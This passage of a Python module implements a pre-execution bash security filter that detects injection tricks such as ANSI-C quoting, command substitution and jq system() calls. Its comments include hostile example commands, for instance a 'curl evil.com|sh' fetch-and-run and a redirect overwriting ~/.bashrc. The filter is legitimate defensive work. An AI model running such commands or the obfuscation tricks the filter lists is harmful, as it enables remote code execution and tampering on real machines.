"""EQUIPA bash_security — pre-execution security filter for bash commands.

Ported from Claude Code's bashSecurity.ts (23 exploit patterns).
This module detects dangerous bash command patterns *before* they are
passed to subprocess, blocking prompt-injection attacks that trick agents
into running shell exploits.

Pure Python stdlib — NO pip dependencies. Uses ``re`` for regex patterns.

Layer 5: No EQUIPA imports (standalone utility module).

Copyright 2026 Forgeborn
"""

from __future__ import annotations

import logging
import re
import shlex
from dataclasses import dataclass

log = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Result type
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class BashSecurityResult:
    """Result of a bash security check.

    Attributes:
        safe: True if the command passed all checks.
        check_id: Numeric identifier of the check that triggered (0 if safe).
        message: Human-readable description of the violation.
    """
    safe: bool
    check_id: int = 0
    message: str = ""


# Sentinel for "command is safe"
_SAFE = BashSecurityResult(safe=True)


# ---------------------------------------------------------------------------
# Check IDs — mirrors BASH_SECURITY_CHECK_IDS from bashSecurity.ts
# ---------------------------------------------------------------------------

class CheckID:
    """Numeric check identifiers matching Claude Code convention."""
    INCOMPLETE_COMMANDS = 1
    JQ_SYSTEM_FUNCTION = 2
    JQ_FILE_ARGUMENTS = 3
    OBFUSCATED_FLAGS = 4
    SHELL_METACHARACTERS = 5
    DANGEROUS_VARIABLES = 6
    NEWLINES = 7
    COMMAND_SUBSTITUTION = 8
    INPUT_REDIRECTION = 9
    OUTPUT_REDIRECTION = 10
    IFS_INJECTION = 11
    PROC_ENVIRON_ACCESS = 13
    BACKSLASH_ESCAPED_WHITESPACE = 15
    BRACE_EXPANSION = 16
    CONTROL_CHARACTERS = 17
    UNICODE_WHITESPACE = 18
    HEREDOC_IN_SUBSTITUTION = 19
    MID_WORD_HASH = 19  # shares slot with heredoc (different check context)
    GIT_COMMIT_SUBSTITUTION = 12
    MALFORMED_TOKEN_INJECTION = 14  # Requires shell parser; not implemented (pure stdlib)
    ZSH_DANGEROUS_COMMANDS = 20
    BACKSLASH_ESCAPED_OPERATORS = 21
    COMMENT_QUOTE_DESYNC = 22
    QUOTED_NEWLINE = 23


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _extract_unquoted(command: str) -> str:
    """Strip single- and double-quoted content, returning only unquoted text.

    Respects bash quoting rules:
    - Backslash escapes the next character (outside single quotes).
    - Single quotes cannot be escaped inside single quotes.
    - Double quotes do not affect single-quote toggling and vice-versa.
    """
    result: list[str] = []
    in_single = False
    in_double = False
    escaped = False

    for ch in command:
        if escaped:
            escaped = False
            if not in_single and not in_double:
                result.append(ch)
            continue

        if ch == "\\" and not in_single:
            escaped = True
            if not in_single and not in_double:
                result.append(ch)
            continue

        if ch == "'" and not in_double:
            in_single = not in_single
            continue

        if ch == '"' and not in_single:
            in_double = not in_double
            continue

        if not in_single and not in_double:
            result.append(ch)

    return "".join(result)


def _extract_unquoted_keep_delimiters(command: str) -> str:
    """Strip quoted *content* but preserve quote delimiter characters.

    Like ``_extract_unquoted`` but keeps ``'`` and ``"`` in the output.
    This is needed by ``_check_mid_word_hash`` to detect quote-adjacent
    ``#`` patterns like ``'x'#`` where full stripping would hide the
    adjacency.
    """
    result: list[str] = []
    in_single = False
    in_double = False
    escaped = False

    for ch in command:
        if escaped:
            escaped = False
            if not in_single and not in_double:
                result.append(ch)
            continue

        if ch == "\\" and not in_single:
            escaped = True
            if not in_single and not in_double:
                result.append(ch)
            continue

        if ch == "'" and not in_double:
            in_single = not in_single
            result.append(ch)  # Keep the delimiter
            continue

        if ch == '"' and not in_single:
            in_double = not in_double
            result.append(ch)  # Keep the delimiter
            continue

        if not in_single and not in_double:
            result.append(ch)

    return "".join(result)


def _get_base_command(command: str) -> str:
    """Extract the first word (base command) from *command*."""
    stripped = command.lstrip()
    # Skip env-var assignments like VAR=val
    while stripped and re.match(r"^[A-Za-z_]\w*=\S*\s+", stripped):
        stripped = re.sub(r"^[A-Za-z_]\w*=\S*\s+", "", stripped, count=1)
    parts = stripped.split(None, 1)
    return parts[0] if parts else ""


def _split_command_segments(command: str) -> list[str]:
    """Split *command* on top-level ``;``, ``&&``, ``||``, ``|``.

    Splits are made only at the top quoting/substitution level — operators
    inside single or double quotes, ``$(...)`` substitutions, or backtick
    substitutions are treated as literal characters. Empty segments are
    dropped; surrounding whitespace is stripped from each returned segment.

    Used by Check 4 (locale quoting) to evaluate the safe-base allowlist
    per chained segment rather than only on the head command. See bug 2316.
    """
    segments: list[str] = []
    buf: list[str] = []
    in_single = False
    in_double = False
    paren_depth = 0  # $(...) depth, tracked outside single quotes
    in_backtick = False
    i = 0
    n = len(command)

    def flush() -> None:
        seg = "".join(buf).strip()
        if seg:
            segments.append(seg)
        buf.clear()

    while i < n:
        ch = command[i]
        nxt = command[i + 1] if i + 1 < n else ""

        if in_single:
            buf.append(ch)
            if ch == "'":
                in_single = False
            i += 1
            continue

        if in_backtick:
            buf.append(ch)
            if ch == "`":
                in_backtick = False
            i += 1
            continue

        # `$(` opens a substitution in both unquoted and double-quoted contexts.
        if ch == "$" and nxt == "(":
            paren_depth += 1
            buf.append(ch)
            buf.append(nxt)
            i += 2
            continue
        if paren_depth > 0:
            if ch == "(":
                paren_depth += 1
            elif ch == ")":
                paren_depth -= 1
            buf.append(ch)
            i += 1
            continue

        if in_double:
            if ch == '"':
                in_double = False
            buf.append(ch)
            i += 1
            continue

        # Outside quotes / substitutions.
        if ch == "'":
            in_single = True
            buf.append(ch)
            i += 1
            continue
        if ch == '"':
            in_double = True
            buf.append(ch)
            i += 1
            continue
        if ch == "`":
            in_backtick = True
            buf.append(ch)
            i += 1
            continue

        # Top-level operators end the current segment.
        if ch == ";":
            flush()
            i += 1
            continue
        if ch == "&" and nxt == "&":
            flush()
            i += 2
            continue
        if ch == "&":
            # Single `&` is bash's background-process separator (cmd1 & cmd2).
            # Attack-equivalent to `;` for per-segment check-4 purposes — see
            # SECURITY-REVIEW-2316.md finding S1. Must come AFTER the `&&`
            # check so the two-char operator is detected first.
            flush()
            i += 1
            continue
        if ch == "|" and nxt == "|":
            flush()
            i += 2
            continue
        if ch == "|":
            flush()
            i += 1
            continue

        buf.append(ch)
        i += 1

    flush()
    return segments


def _has_backslash_escaped_whitespace(command: str) -> bool:
    """Detect backslash-space or backslash-tab outside quotes."""
    in_single = False
    in_double = False
    i = 0
    while i < len(command):
        ch = command[i]
        if ch == "\\" and not in_single:
            if not in_double and i + 1 < len(command):
                nxt = command[i + 1]
                if nxt in (" ", "\t"):
                    return True
            i += 2
            continue
        if ch == '"' and not in_single:
            in_double = not in_double
        elif ch == "'" and not in_double:
            in_single = not in_single
        i += 1
    return False


def _has_backslash_escaped_operator(command: str) -> bool:
    r"""Detect ``\;``, ``\|``, ``\&``, ``\<``, ``\>`` outside quotes."""
    operators = frozenset(";|&<>")
    in_single = False
    in_double = False
    i = 0
    while i < len(command):
        ch = command[i]
        if ch == "\\" and not in_single:
            if not in_double and i + 1 < len(command):
                if command[i + 1] in operators:
                    return True
            i += 2
            continue
        if ch == "'" and not in_double:
            in_single = not in_single
        elif ch == '"' and not in_single:
            in_double = not in_double
        i += 1
    return False


def _is_escaped_at(content: str, pos: int) -> bool:
    """Return True if character at *pos* is preceded by an odd number of backslashes."""
    count = 0
    i = pos - 1
    while i >= 0 and content[i] == "\\":
        count += 1
        i -= 1
    return count % 2 == 1


def _has_shell_level_char(command: str, chars: str) -> bool:
    """Return True if any character in *chars* appears at the shell level.

    "Shell level" means outside every single/double-quoted string literal and
    not backslash-escaped — i.e. a position where the character would act as a
    real shell operator rather than literal data. This is the shared
    quote-aware pre-pass used to stop operators embedded inside quoted string
    literals (``grep -rn "SATS->ECHO"``, ``echo "a|b"``) from tripping the
    pattern-scanning checks (task 2652).
    """
    in_single = False
    in_double = False
    escaped = False
    for ch in command:
        if escaped:
            escaped = False
            continue
        if ch == "\\" and not in_single:
            escaped = True
            continue
        if in_single:
            if ch == "'":
                in_single = False
            continue
        if in_double:
            if ch == '"':
                in_double = False
            continue
        if ch == "'":
            in_single = True
            continue
        if ch == '"':
            in_double = True
            continue
        if ch in chars:
            return True
    return False


def _scan_shell_level_dollar_quotes(command: str) -> set[str]:
    r"""Detect genuine ANSI-C (``$'...'``) and locale (``$"..."``) quoting.

    Returns a set that may contain ``"ansi-c"`` and/or ``"locale"``.

    A ``$'`` or ``$"`` sequence is a real bash quoting construct ONLY when the
    ``$`` sits at the shell level — outside any existing quoted string and not
    backslash-escaped. The same two-character sequence appearing *inside* a
    double- or single-quoted literal (e.g. a ``$`` immediately before a
    closing ``'`` in a ``python -c "print('cost: $', x)"`` body) is ordinary
    literal text, not a quoting construct, and must not be reported.

    This replaces the previous raw ``re.search(r"\$'[^']*'", command)`` /
    ``re.search(r'\$"[^"]*"', command)`` scans, which matched such sequences
    regardless of the surrounding quote context and produced check-4 false
    positives (task 2652). ``\$'...'`` (an escaped dollar) is correctly NOT
    reported, matching bash semantics where ``\$`` is a literal ``$``.
    """
    kinds: set[str] = set()
    in_single = False
    in_double = False
    escaped = False
    n = len(command)
    i = 0
    while i < n:
        ch = command[i]
        if escaped:
            escaped = False
            i += 1
            continue
        if ch == "\\" and not in_single:
            escaped = True
            i += 1
            continue
        if in_single:
            if ch == "'":
                in_single = False
            i += 1
            continue
        if in_double:
            if ch == '"':
                in_double = False
            i += 1
            continue
        # Unquoted, unescaped shell-level context.
        if ch == "$" and i + 1 < n:
            nxt = command[i + 1]
            if nxt == "'":
                kinds.add("ansi-c")
                # Enter the ANSI-C single-quoted region so its body (which may
                # contain " or $) does not perturb detection of later tokens.
                in_single = True
                i += 2
                continue
            if nxt == '"':
                kinds.add("locale")
                in_double = True
                i += 2
                continue
        if ch == "'":
            in_single = True
        elif ch == '"':
            in_double = True
        i += 1
    return kinds


# ---------------------------------------------------------------------------
# Unicode whitespace pattern (matches bashSecurity.ts UNICODE_WS_RE)
# ---------------------------------------------------------------------------

_UNICODE_WS_RE = re.compile(
    "[\u00a0\u1680\u2000-\u200f\u2028\u2029\u202f\u205f\u3000\ufeff]"
)

# ---------------------------------------------------------------------------
# Command substitution patterns (from COMMAND_SUBSTITUTION_PATTERNS)
# ---------------------------------------------------------------------------

_COMMAND_SUBSTITUTION_PATTERNS: list[tuple[re.Pattern[str], str]] = [
    (re.compile(r"<\("), "process substitution <()"),
    (re.compile(r">\("), "process substitution >()"),
    (re.compile(r"=\("), "Zsh process substitution =()"),
    (re.compile(r"(?:^|[\s;&|])=[a-zA-Z_]"), "Zsh equals expansion (=cmd)"),
    (re.compile(r"\$\("), "$() command substitution"),
    (re.compile(r"\$\{"), "${} parameter substitution"),
    (re.compile(r"\$\["), "$[] legacy arithmetic expansion"),
    (re.compile(r"~\["), "Zsh-style parameter expansion"),
    (re.compile(r"\(e:"), "Zsh-style glob qualifiers"),
    (re.compile(r"\(\+"), "Zsh glob qualifier with command execution"),
    (re.compile(r"\}\s*always\s*\{"), "Zsh always block"),
    (re.compile(r"<#"), "PowerShell comment syntax"),
]


# ---------------------------------------------------------------------------
# Individual checks — each returns BashSecurityResult
# ---------------------------------------------------------------------------

def _check_incomplete_commands(command: str) -> BashSecurityResult:
    """Check 1: Incomplete command fragments."""
    trimmed = command.strip()
    if re.match(r"^\s*\t", command):
        return BashSecurityResult(
            safe=False, check_id=CheckID.INCOMPLETE_COMMANDS,
            message="Command starts with tab (incomplete fragment)",
        )
    if trimmed.startswith("-"):
        return BashSecurityResult(
            safe=False, check_id=CheckID.INCOMPLETE_COMMANDS,
            message="Command starts with flags (incomplete fragment)",
        )
    if re.match(r"^\s*(&&|\|\||;|>>?|<)", command):
        return BashSecurityResult(
            safe=False, check_id=CheckID.INCOMPLETE_COMMANDS,
            message="Command starts with operator (continuation line)",
        )
    # Trailing operator: command ends with |, ;, && (incomplete, expects more)
    # Exception: \; at end is standard find -exec terminator, not incomplete
    if re.search(r"(?:\||&&|\|\||;)\s*$", trimmed):
        # Allow \; at end when used in find -exec context (POSIX standard)
        if trimmed.rstrip().endswith("\\;") and re.search(
            r"\bfind\b", trimmed
        ) and re.search(r"-exec(?:dir)?\b", trimmed):
            pass  # Safe: find -exec ... \;
        else:
            return BashSecurityResult(
                safe=False, check_id=CheckID.INCOMPLETE_COMMANDS,
                message="Command ends with trailing operator (incomplete fragment)",
            )
    return _SAFE


def _check_jq_exploits(command: str, base_cmd: str) -> BashSecurityResult:
    """Checks 2-3: jq system() and dangerous file flags."""
    # Check both base_cmd and anywhere in pipe chain
    has_jq = base_cmd == "jq" or re.search(r"(?:^|\|)\s*jq\b", command)
    if not has_jq:
        return _SAFE
    if re.search(r"\bsystem\s*\(", command):
        return BashSecurityResult(
            safe=False, check_id=CheckID.JQ_SYSTEM_FUNCTION,
            message="jq command contains system() which executes arbitrary commands",
        )
    after_jq = command[len("jq"):].lstrip()
    if re.search(
        r"(?:^|\s)(?:-f\b|--from-file|--rawfile|--slurpfile|-L\b|--library-path)",
        after_jq,
    ):
        return BashSecurityResult(
            safe=False, check_id=CheckID.JQ_FILE_ARGUMENTS,
            message="jq command contains file flags that could read arbitrary files",
        )
    # @base64d, @html, @csv, @uri, @text — jq format strings that
    # can decode/transform data in dangerous ways
    if re.search(r"@base64d\b", command):
        return BashSecurityResult(
            safe=False, check_id=CheckID.JQ_FILE_ARGUMENTS,
            message="jq command contains @base64d which can decode hidden payloads",
        )
    return _SAFE


def _parse_git_commit_message(command: str) -> tuple[str, str, str] | None:
    """Quote-aware tokenizer for ``git commit ... -m <msg> [remainder]``.

    Walks the command character-by-character respecting quote and escape
    state, so multi-line messages containing ``$``, backticks, escaped
    quotes, or embedded newlines do not desync the parser the way a
    non-greedy regex does.

    Returns a tuple ``(quote, message_content, remainder)`` if a quoted
    ``-m`` argument is found, or ``None`` if no quoted message is present
    (in which case the command is treated as safe by the caller — other
    validators handle metacharacters before ``-m``).
    """
    # Verify the command starts with `git commit` and find the prefix region
    if not re.match(r"^git[ \t]+commit\b", command):
        return None

    # Walk to find the `-m` flag respecting quotes. Anything before -m must
    # be plain whitespace or git flags — reject embedded shell metacharacters
    # (the original char-class guard).
    n = len(command)
    i = 0
    in_single = False
    in_double = False
    escaped = False

    # Skip past `git commit`
    m = re.match(r"^git[ \t]+commit[ \t]+", command)
    if not m:
        return None
    i = m.end()

    # Walk until we find `-m` outside of quotes
    m_pos = -1
    while i < n:
        ch = command[i]
        if escaped:
            escaped = False
            i += 1
            continue
        if ch == "\\" and not in_single:
            escaped = True
            i += 1
            continue
        if ch == "'" and not in_double:
            in_single = not in_single
            i += 1
            continue
        if ch == '"' and not in_single:
            in_double = not in_double
            i += 1
            continue
        if not in_single and not in_double:
            # Reject shell metacharacters in the pre-message region
            if ch in ";&|`$<>()\n\r":
                # `(` may legitimately appear in a flag value? No — git commit
                # flags don't use parens. Treat as a metacharacter and bail.
                return None
            # Detect `-m` token
            if (
                ch == "-"
                and i + 1 < n
                and command[i + 1] == "m"
                and (i + 2 == n or command[i + 2] in " \t")
                and (i == 0 or command[i - 1] in " \t")
            ):
                m_pos = i
                break
        i += 1

    if m_pos < 0:
        return None
    if in_single or in_double or escaped:
        return None

    # Skip past `-m` and following whitespace
    j = m_pos + 2
    while j < n and command[j] in " \t":
        j += 1
    if j >= n:
        return None

    quote = command[j]
    if quote not in ('"', "'"):
        return None

    # Walk the quoted message respecting escape state. The closing quote is
    # the FIRST unescaped quote of the same kind — but we honor backslash
    # escapes (only inside double quotes; single quotes cannot be escaped).
    k = j + 1
    msg_chars: list[str] = []
    msg_escaped = False
    while k < n:
        ch = command[k]
        if msg_escaped:
            msg_chars.append(ch)
            msg_escaped = False
            k += 1
            continue
        if quote == '"' and ch == "\\":
            msg_escaped = True
            msg_chars.append(ch)
            k += 1
            continue
        if ch == quote:
            break
        msg_chars.append(ch)
        k += 1
    else:
        # Unterminated quote — let other validators handle it
        return None

    message_content = "".join(msg_chars)
    remainder = command[k + 1:]
    return quote, message_content, remainder


# `$(cat <<'DELIM' ... DELIM)` and `$(cat <<\DELIM ... DELIM)` use a
# quoted heredoc delimiter, which prevents shell expansion inside the body.
# `cat` simply outputs literal text — no command execution. This is the
# canonical Claude Code multi-line commit pattern.
_BENIGN_CAT_HEREDOC_RE = re.compile(
    r"""^\$\(\s*cat\s+<<\s*(?:'(?P<sq>[A-Za-z_][A-Za-z0-9_]*)'"""
    r"""|"(?P<dq>[A-Za-z_][A-Za-z0-9_]*)\""""
    r"""|\\(?P<bs>[A-Za-z_][A-Za-z0-9_]*))"""
    r"""\s*\n[\s\S]*?\n\s*(?P=sq)\s*\n?\s*\)\s*$""",
    re.MULTILINE,
)


def _is_benign_cat_heredoc_inner(inner: str) -> bool:
    """True if ``inner`` (the body of a ``$(...)``) is a single
    ``cat <<'DELIM' ... DELIM`` with a quoted or backslash-escaped delimiter.

    Quoted/escaped delimiters suppress parameter and command expansion inside
    the heredoc body, so ``cat`` only emits literal text — no execution.
    Unquoted ``<<EOF`` is NOT benign because expansions still happen.
    """
    stripped = inner.strip()
    for pattern in (
        # Single-quoted delimiter: <<'EOF'
        r"^cat\s+<<-?\s*'([A-Za-z_][A-Za-z0-9_]*)'\s*\n"
        r"[\s\S]*?\n\s*\1\s*$",
        # Double-quoted delimiter: <<"EOF" (also suppresses expansion)
        r'^cat\s+<<-?\s*"([A-Za-z_][A-Za-z0-9_]*)"\s*\n'
        r'[\s\S]*?\n\s*\1\s*$',
        # Backslash-escaped delimiter: <<\EOF (also suppresses expansion)
        r"^cat\s+<<-?\s*\\([A-Za-z_][A-Za-z0-9_]*)\s*\n"
        r"[\s\S]*?\n\s*\1\s*$",
    ):
        if re.match(pattern, stripped):
            return True
    return False


def _is_benign_cat_heredoc_substitution(message: str) -> bool:
    """True if the message is exactly a single ``$(cat <<'DELIM' ... DELIM)``.

    Only quoted (single or double) or backslash-escaped heredoc delimiters
    are considered benign — those forms suppress parameter and command
    expansion inside the heredoc body, so the substitution can only emit
    literal text. Unquoted ``<<EOF`` is NOT benign because expansions
    still happen.
    """
    stripped = message.strip()
    if not stripped.startswith("$(") or not stripped.endswith(")"):
        return False
    inner = stripped[2:-1]
    return _is_benign_cat_heredoc_inner(inner)


# Whitelist of post-commit output filters allowed in the unquoted remainder
# after a `git commit -m "..."` argument. Keeps the surface area minimal —
# any pipe to a command outside this list still trips check 12.
_BENIGN_COMMIT_PIPE_CMDS = ("tail", "head", "cat", "wc", "grep")
_BENIGN_COMMIT_PIPE_RE = re.compile(
    r"\|\s*(?:" + "|".join(_BENIGN_COMMIT_PIPE_CMDS) + r")(?:\s+[\w./-]+)*\s*$"
)
_BENIGN_STDERR_REDIRECT_RE = re.compile(r"2\s*>\s*&\s*1")


def _strip_benign_commit_remainder(remainder: str) -> str:
    """Strip allowlisted output-capture patterns from a git-commit remainder.

    Permits ``2>&1`` (numeric stderr-to-stdout redirect) and a single trailing
    ``| <cmd> [args]`` where ``<cmd>`` is in ``_BENIGN_COMMIT_PIPE_CMDS``.
    Anything left over is fed back into the normal metacharacter check, so
    additional pipes / operators / non-whitelisted commands still block.

    Regression context: bug 2214 — check 12 was killing GutenForge dispatches
    on benign `git commit -m "msg" 2>&1 | tail -10` invocations because the
    `|` and `&` in the remainder tripped the metacharacter gate. The 2158
    benign-cat-heredoc allowlist is the design model for this whitelist.
    """
    cleaned = _BENIGN_STDERR_REDIRECT_RE.sub(" ", remainder)
    cleaned = _BENIGN_COMMIT_PIPE_RE.sub(" ", cleaned)
    return cleaned


_GIT_COMMIT_M_ARG_RE = re.compile(r'-m\s+(?:"([^"]*)"|\'([^\']*)\')')


def _is_git_commit_multi_paragraph(command: str) -> bool:
    """True if *command* is ``git commit ... -m "" ...`` with a non-empty
    ``-m`` on EACH side of the empty one.

    Git's documented multi-paragraph syntax is
    ``git commit -m "subject" -m "" -m "body"`` — the empty ``-m`` inserts
    a blank paragraph separator. Check 4's "empty quotes before dash"
    heuristic was false-positiving on this benign pattern (bug 2214,
    GutenForge BR-D #2209 killed at turn 18).

    The check only fires for ``git commit`` invocations and requires an
    empty ``-m`` *between* two non-empty ``-m``s for the same invocation —
    a single trailing/leading empty ``-m`` (e.g. ``git commit -m ""``) is
    still considered suspicious and continues to trip check 4 / check 12.
    """
    if not re.match(r"^\s*git\s+commit\b", command):
        return False
    matches = _GIT_COMMIT_M_ARG_RE.findall(command)
    if len(matches) < 3:
        return False
    values = [dq or sq for dq, sq in matches]
    for i in range(1, len(values) - 1):
        if values[i] == "" and values[i - 1] != "" and values[i + 1] != "":
            return True
    return False


def _check_git_commit_substitution(
    command: str, base_cmd: str,
) -> BashSecurityResult:
    """Check 12: Command substitution inside git commit -m messages.

    ``git commit -m "$(evil)"`` expands the substitution before git sees it.
    Double-quoted messages allow expansion; single-quoted are safe.

    The canonical Claude Code multi-line commit pattern
    ``git commit -m "$(cat <<'EOF' ... EOF)"`` is permitted because the
    single-quoted heredoc delimiter suppresses all expansion inside the
    body — ``cat`` only emits literal text.

    Also blocks:
    - Shell metacharacters in the remainder after the -m "..." argument
      (e.g., ``git commit -m 'msg' > ~/.bashrc``)
    - Commit messages starting with ``-`` (flag-like obfuscation)
    """
    if base_cmd != "git":
        return _SAFE
    if not re.match(r"^git\s+commit\s+", command):
        return _SAFE

    parsed = _parse_git_commit_message(command)
    if parsed is None:
        return _SAFE

    quote, message_content, remainder = parsed

    # Double-quoted message with $(), ``, or ${} — block UNLESS the message
    # is a benign single-quoted-delimiter cat-heredoc (the canonical
    # multi-line commit pattern).
    if quote == '"' and re.search(r"\$\(|`|\$\{", message_content):
        if not _is_benign_cat_heredoc_substitution(message_content):
            return BashSecurityResult(
                safe=False,
                check_id=CheckID.GIT_COMMIT_SUBSTITUTION,
                message="Git commit message contains command substitution patterns",
            )

    # Remainder after the closing quote: ignore plain whitespace, additional
    # git flags, and trailing newlines. Only flag genuine shell operators
    # in unquoted regions of the remainder. Strip allowlisted output-capture
    # patterns (`2>&1`, trailing `| tail/head/cat/wc/grep ...`) first — bug
    # 2214: these are legitimate shell composition for capturing git output.
    if remainder.strip():
        # Per-segment evaluation (bug 2446, follow-up to 2316): a trailing
        # ``&& <cmd>`` is legitimate shell sequencing, not injection. Strip
        # the leading ``&&`` and re-validate the trailing segment through
        # the full bash security pipeline — every check (including check 12
        # again if it's another git commit) runs against the trailing
        # command on its own merits. If the trailing segment is safe, the
        # whole chain is safe. Note: ``;`` and ``|`` stay blocked here
        # because they are higher-risk (``;`` is the classic injection
        # operator; ``|`` exfiltrates stdout to the next command).
        and_chain = re.match(r"\A\s*&&\s+(.+)\Z", remainder, re.DOTALL)
        if and_chain:
            trailing = and_chain.group(1).strip()
            if trailing:
                return check_bash_command(trailing)

        unquoted_rem = _extract_unquoted(remainder)
        unquoted_rem = _strip_benign_commit_remainder(unquoted_rem)
        if re.search(r"[;|&()`]|\$\(|\$\{", unquoted_rem):
            return BashSecurityResult(
                safe=False,
                check_id=CheckID.GIT_COMMIT_SUBSTITUTION,
                message="Git commit has shell metacharacters after -m argument",
            )
        if re.search(r"[<>]", unquoted_rem):
            return BashSecurityResult(
                safe=False,
                check_id=CheckID.GIT_COMMIT_SUBSTITUTION,
                message="Git commit remainder contains unquoted redirect operator",
            )

    # Message starting with dash — flag obfuscation
    if message_content.startswith("-"):
        return BashSecurityResult(
            safe=False,
            check_id=CheckID.OBFUSCATED_FLAGS,
            message="Git commit message starts with dash (potential flag obfuscation)",
        )

    return _SAFE


def _check_obfuscated_flags(command: str, base_cmd: str) -> BashSecurityResult:
    """Check 4: ANSI-C quoting, locale quoting, empty-quote flag hiding."""
    # Echo without operators is safe
    if base_cmd == "echo" and not re.search(r"[|&;]", command):
        return _SAFE

    # Git's documented multi-paragraph commit syntax uses an empty `-m ""`
    # between two non-empty `-m "..."` args to insert a blank paragraph.
    # The empty-quote heuristics below would false-positive on it (bug 2214,
    # GutenForge BR-D #2209). Detect and skip the empty-quote heuristics
    # for this exact pattern; ANSI-C / locale-quoting checks still apply.
    skip_empty_quote_checks = _is_git_commit_multi_paragraph(command)

    # Quote-aware detection of ANSI-C ($'...') and locale ($"...") quoting.
    # Only genuine shell-level constructs are reported — a $' or $" sequence
    # buried inside a quoted string literal is literal text, not a quoting
    # construct, and must not fire (task 2652: raw regex scanning tripped
    # check-4 on a `$` before a closing `'` inside a python -c body).
    dollar_quote_kinds = _scan_shell_level_dollar_quotes(command)

    # ANSI-C quoting: $'...' — always blocked (no legitimate allowlist).
    if "ansi-c" in dollar_quote_kinds:
        return BashSecurityResult(
            safe=False, check_id=CheckID.OBFUSCATED_FLAGS,
            message="Command contains ANSI-C quoting ($'...') which can hide characters",
        )

    # Locale quoting: $"..."
    # Threat model: $"..." is bash i18n syntax; theoretically can carry hidden
    # characters. In practice it is only used as an attack primitive when
    # combined with command-execution tools. Allow it when the surrounding
    # command is a known-safe read-only text tool (grep/sed/awk/find), where
    # the pattern is the legitimate use case (passing localized search terms).
    # Loosen for task #2096-class false positives while keeping the block
    # active for cmd/eval/sh/bash/python/node/etc.
    #
    # Per-segment evaluation (bug 2316): split on top-level `;`/`&&`/`||`/`|`
    # and evaluate the allowlist against EACH chained segment's own first
    # word. Without this, a safe head (`git status; python -c $"x"`) would
    # whitewash an exec primitive in a later segment.
    if "locale" in dollar_quote_kinds:
        segments = _split_command_segments(command)
        # Fall back to whole-command behavior when the splitter produced no
        # segments (defensive — empty/whitespace-only input).
        if not segments:
            segments = [command]
        for segment in segments:
            if "locale" not in _scan_shell_level_dollar_quotes(segment):
                continue
            seg_base = _get_base_command(segment)
            if seg_base not in _LOCALE_QUOTING_SAFE_BASES:
                return BashSecurityResult(
                    safe=False, check_id=CheckID.OBFUSCATED_FLAGS,
                    message="Command contains locale quoting ($\"...\") which can hide characters",
                )

    # Empty ANSI-C or locale quotes before dash: $''-exec or $""-exec
    if not skip_empty_quote_checks and re.search(r"""\$['\"]{2}\s*-""", command):
        return BashSecurityResult(
            safe=False, check_id=CheckID.OBFUSCATED_FLAGS,
            message="Command contains empty special quotes before dash",
        )

    # Empty quote pairs before dash: ''-exec, ""-exec
    if not skip_empty_quote_checks and re.search(
        r"""(?:^|\s)(?:''|""){1,}\s*-""", command,
    ):
        return BashSecurityResult(
            safe=False, check_id=CheckID.OBFUSCATED_FLAGS,
            message="Command contains empty quotes before dash (potential bypass)",
        )

    # Empty quote pairs inside a flag: -''la, -""la (splitting flag to evade filters)
    if re.search(r"""-\w*(?:''|"")\w""", command):
        return BashSecurityResult(
            safe=False, check_id=CheckID.OBFUSCATED_FLAGS,
            message="Command contains empty quotes inside flag (obfuscation)",
        )

    # Empty quote pairs adjacent to quoted dash: """-f"
    if re.search(r"""(?:""|''){1,}['\"]-""", command):
        return BashSecurityResult(
            safe=False, check_id=CheckID.OBFUSCATED_FLAGS,
            message="Command contains empty quote pair adjacent to quoted dash",
        )

    # 3+ consecutive quotes at word start
    if re.search(r"""(?:^|\s)['\"]{3,}""", command):
        return BashSecurityResult(
            safe=False, check_id=CheckID.OBFUSCATED_FLAGS,
            message="Command contains consecutive quote chars at word start",
        )

    return _SAFE


def _extract_dollar_paren_inners(text: str) -> list[str]:
    """Return the inner text of every top-level ``$(...)`` substitution.

    Naive nesting-aware scan — does not handle quoted parens inside the
    substitution, but the surrounding caller has already stripped quoted
    content.
    """
    inners: list[str] = []
    i = 0
    while i < len(text) - 1:
        if text[i] == "$" and text[i + 1] == "(":
            depth = 1
            j = i + 2
            start = j
            while j < len(text) and depth > 0:
                if text[j] == "(":
                    depth += 1
                elif text[j] == ")":
                    depth -= 1
                    if depth == 0:
                        inners.append(text[start:j])
                        break
                j += 1
            i = j + 1
        else:
            i += 1
    return inners


def _is_safe_substitution_inner(inner: str) -> bool:
    """True if the body of a ``$(...)`` is a known-safe read-only command."""
    stripped = inner.strip()
    if not stripped:
        return False
    # Reject anything with shell separators or pipes inside — keeps the
    # allowlist surface minimal. Single-command substitutions only.
    if re.search(r"[;&|]|\$\(|`", stripped):
        return False
    base = _get_base_command(stripped)
    if base in _DANGEROUS_SUBSTITUTION_COMMANDS:
        return False
    if base in _SAFE_SUBSTITUTION_COMMANDS:
        return True
    return False


def _check_command_substitution(unquoted: str) -> BashSecurityResult:
    """Check 8: Backticks and command substitution patterns.

    Threat model: ``$(curl evil.com|sh)`` runs attacker code. BUT
    ``$(git rev-parse HEAD)`` and ``$(date +%Y%m%d)`` are routine dev work
    (task #2096). Loosen ``$(...)`` to allow read-only commands from
    _SAFE_SUBSTITUTION_COMMANDS while keeping the dangerous-command list
    blocked, and keeping all OTHER substitution forms (backticks, ``<()``,
    ``${...}``, etc.) blocked unconditionally.
    """
    # Check for unescaped backticks
    i = 0
    while i < len(unquoted):
        if unquoted[i] == "\\" and i + 1 < len(unquoted):
            i += 2
            continue
        if unquoted[i] == "`":
            return BashSecurityResult(
                safe=False, check_id=CheckID.COMMAND_SUBSTITUTION,
                message="Command contains backticks (`) for command substitution",
            )
        i += 1

    # Pre-screen $(...) for the allowlist before the broad pattern fires.
    dollar_paren_re = re.compile(r"\$\(")
    if dollar_paren_re.search(unquoted):
        inners = _extract_dollar_paren_inners(unquoted)
        # If every $(...) substitution is safe, strip them before the
        # pattern loop so the broad "$(" pattern does not re-flag them.
        if inners and all(_is_safe_substitution_inner(inner) for inner in inners):
            scrubbed = re.sub(r"\$\([^()]*\)", "", unquoted)
        else:
            scrubbed = unquoted
    else:
        scrubbed = unquoted

    for pattern, desc in _COMMAND_SUBSTITUTION_PATTERNS:
        if pattern.search(scrubbed):
            return BashSecurityResult(
                safe=False, check_id=CheckID.COMMAND_SUBSTITUTION,
                message=f"Command contains {desc}",
            )
    return _SAFE


def _check_redirections(command: str, unquoted: str) -> BashSecurityResult:
    """Checks 9-10: Input and output redirection in unquoted content.

